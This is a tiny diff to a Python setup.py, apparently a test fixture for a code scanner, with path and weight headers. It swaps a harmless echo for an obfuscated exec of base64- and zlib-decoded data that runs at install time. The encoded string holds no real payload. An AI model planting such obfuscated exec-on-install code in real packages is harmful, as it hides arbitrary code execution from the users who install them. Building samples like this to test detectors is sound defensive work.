@@ -1,8 +1,8 @@
 # path: setup.py
-# lines: 2, 3
+# lines: 3
 # weight: 35
 # ---
+import base64, zlib
 from setuptools import setup
-import subprocess
-subprocess.run(["echo", "gitray-test"])
+exec(zlib.decompress(base64.b64decode("eA==")))
 setup(name="demo")
